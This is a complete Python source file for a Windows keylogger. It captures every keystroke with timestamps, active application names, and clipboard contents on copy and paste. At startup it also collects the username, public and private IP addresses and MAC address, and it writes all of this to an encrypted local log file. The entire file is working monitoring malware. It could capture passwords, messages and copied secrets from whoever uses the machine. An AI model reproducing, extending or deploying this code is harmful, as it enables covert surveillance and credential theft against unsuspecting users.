from pynput.keyboard import Listener, Key
from datetime import datetime   #For timestamps
import win32gui  #To get the active window handle (number format)
import win32process #To get the process ID (PID) of that window
import psutil  #To get the name of the active application from PID
import pyperclip  #Reads clipboard content
import time  #Measuring typing speed (keystrokes per minute)
import socket #To get the private IP address of the device
import requests #Sends a request to an external API to fetch the public IP address
import getpass  #To get the username
import uuid  #To get the MAC address of the system’s network adapter

from cryptography.fernet import Fernet  #It is for symmetric encryption
import os  #To interact with the operating system

#Fernet handles all the critical parts of encryption behind the scenes — 
#including generating a secure IV, performing AES encryption in CBC mode and verifying data integrity using HMAC.

KEY_FILE = "key.key" #Names a file

def generate_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as key_file:
            key_file.write(key)

def load_key():
    with open(KEY_FILE, "rb") as key_file:
        return key_file.read()

# Encrypt and write log
def write_encrypted_log(data):
    key = load_key()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data.encode())
    with open("log.txt", "wb") as f:
        f.write(encrypted_data)

# Decrypt and read log (for viewing)
def read_decrypted_log():
    key = load_key()
    fernet = Fernet(key)
    with open("log.txt", "rb") as f:
        encrypted_data = f.read()
    return fernet.decrypt(encrypted_data).decode()



# Variables to track key states
caps_lock = False
shift_pressed = False
log_buffer = []
current_app = None
last_clipboard = None

# Typing speed tracking variables
start_time = time.time()
keystroke_count = 0
word_count = 0

# Special keys mapping
special_keys = {
    Key.esc: "[Esc]",
    Key.shift: "[Shift]",
    Key.shift_r: "[Shift]",
    Key.ctrl_l: "[Ctrl]",
    Key.ctrl_r: "[Ctrl]",
    Key.alt_l: "[Alt]",
    Key.alt_r: "[Alt]",
    Key.delete: "[Delete]",
    Key.home: "[Home]",
    Key.end: "[End]",
    Key.page_up: "[PageUp]",
    Key.page_down: "[PageDown]",
    Key.up: "[Arrow_Up]",
    Key.down: "[Arrow_Down]",
    Key.left: "[Arrow_Left]",
    Key.right: "[Arrow_Right]"
}

#Gets public IP, private IP, MAC address, and user information.
def get_network_info():
    try:
        public_ip = requests.get("https://api64.ipify.org").text  #fetching your device’s public IP address using the internet.
    except requests.RequestException:
        public_ip = "Unavailable"
    
    private_ip = socket.gethostbyname(socket.gethostname())
    mac_address = ':'.join(format(x, '02x') for x in uuid.getnode().to_bytes(6, 'big'))
    username = getpass.getuser()
    
    info = (f"User: {username}\n"
            f"Public IP: {public_ip}\n"
            f"Private IP: {private_ip}\n"
            f"MAC Address: {mac_address}\n")
    
    return info

def get_active_application():
    try:
        hwnd = win32gui.GetForegroundWindow()  # Get active window handle, a unique ID that identifies an open window
        _, pid = win32process.GetWindowThreadProcessId(hwnd)  # Get process ID and ignore thread ID
        process = psutil.Process(pid)  # Get process object
        return process.name().replace(".exe", "")  # Get application name only
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        return "Unknown App"


def calculate_typing_speed():
    global start_time, keystroke_count, word_count

    elapsed_time = time.time() - start_time
    if elapsed_time >= 10:  # Every 10 seconds calculate speed
        wpm = (word_count / elapsed_time) * 60 if word_count > 0 else 0
        kpm = (keystroke_count / elapsed_time) * 60 if keystroke_count > 0 else 0

        print(f"[Typing Speed: {wpm:.2f} WPM | {kpm:.2f} KPM]")

        log_entry = f"\n[Typing Speed: {wpm:.2f} WPM | {kpm:.2f} KPM]\n"
        log_buffer.append(log_entry)
        write_to_file()

        # Reset counters
        start_time = time.time()
        keystroke_count = 0
        word_count = 0

# Generate encryption key if not exists
generate_key()


def write_to_file():
    """Encrypts and writes the log buffer to a file."""
    full_log = ''.join(log_buffer)
    write_encrypted_log(full_log)


def log_clipboard():
    """Logs the clipboard content immediately when Ctrl+C is pressed."""
    global last_clipboard
    clipboard_content = pyperclip.paste()
    if clipboard_content and clipboard_content != last_clipboard:
        last_clipboard = clipboard_content
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"\n[{timestamp}] [Clipboard]: {clipboard_content}\n"
        print(f"[COPY]: {clipboard_content}")
        log_buffer.append(log_entry)
        write_to_file()

def log_key(key):
    global caps_lock, shift_pressed, log_buffer, current_app, keystroke_count, word_count

    active_app = get_active_application()

    if active_app != current_app:
        current_app = active_app
        log_buffer.append(f"\n[Switched to: {current_app}]\n")

    # Handle clipboard logging when Ctrl+C is pressed
    if hasattr(key, 'char'):
        if key.char == '\x03':  # Detect Ctrl+C
            log_clipboard()
            return 
        elif key.char == '\x16':  # Detect Ctrl+V (paste)
            clipboard_content = pyperclip.paste()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            paste_entry = f"\n[{timestamp}] [PASTE]: {clipboard_content}\n"
            print(f"[PASTE]: {clipboard_content}")  # Print to console
            log_buffer.append(paste_entry)
            write_to_file()
            return  

    if key in special_keys:
        letter = special_keys[key]
    elif key == Key.caps_lock:
        caps_lock = not caps_lock
        return
    elif key in [Key.shift, Key.shift_r, Key.shift_l]:
        shift_pressed = True
        return
    elif key == Key.space:
        letter = ' '
        word_count += 1  
    elif key == Key.enter:
        letter = '\n'
        word_count += 1  
    elif key == Key.tab:
        letter = '    '  
    elif key == Key.backspace:
        if log_buffer:
            log_buffer.pop()  
        write_to_file()
        return
    else:
        letter = str(key).replace("'", "")  #'a' becomes a

    if letter.startswith("Key.f"):
        letter = f"[{letter.replace('Key.', '').upper()}]"  #For function keys F1, F2, etc.

    if letter.isalpha():
        if caps_lock ^ shift_pressed:  
            letter = letter.upper()
        else:
            letter = letter.lower()

    keystroke_count += 1

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {letter}\n"

    log_buffer.append(log_entry)  
    write_to_file()  
    calculate_typing_speed()

def on_release(key):
    global shift_pressed
    if key in [Key.shift, Key.shift_r, Key.shift_l]:
        shift_pressed = False 

# Add system information to log_buffer once at the start
log_buffer.append("\n[System Information]\n")
log_buffer.append(get_network_info() + "\n")

# Ensure system information is written before keylogging starts
write_to_file()

 

# Start listener
with Listener(on_press=log_key, on_release=on_release) as listener:
    listener.join()
